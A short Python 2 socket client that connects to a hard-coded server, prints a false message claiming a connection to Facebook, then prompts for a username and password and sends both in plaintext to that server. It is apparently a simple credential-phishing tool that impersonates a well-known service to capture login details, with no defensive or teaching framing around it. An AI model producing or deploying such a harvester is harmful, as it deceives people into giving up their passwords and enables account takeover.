import socket
import os
import sys
from thread import*
import getpass

HOST ='10.0.0.4' #server ip -can be replaced with the canonical name
PORT= 5000 #HOST port can be random

try:	
	#try creating the socket
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	#it is different from UDP socket in terms of parameters
	#UDP socket is SOCK_DGRAM
except socket.error:	
	#socket.error encapsulates all the errors in socket
	print 'Socket creation Failed'
	sys.exit()
print 'Socket created'

try:
	s.connect((HOST,PORT))
except socket.error,msg:
	print 'SERVER UNREACHABLE -- ERROR' + msg
	sys.exit()
print 'now connected to facebook'

#client connected to server
uname=raw_input('username: ')
passwd=getpass.getpass('password: ')
data='Username: ' + uname + ' Password: ' + passwd
try:
	s.send(data)
except socket.error:
	#send data fail
	print 'Authentication Error - login details not sent'
	sys.exit()		
s.close()
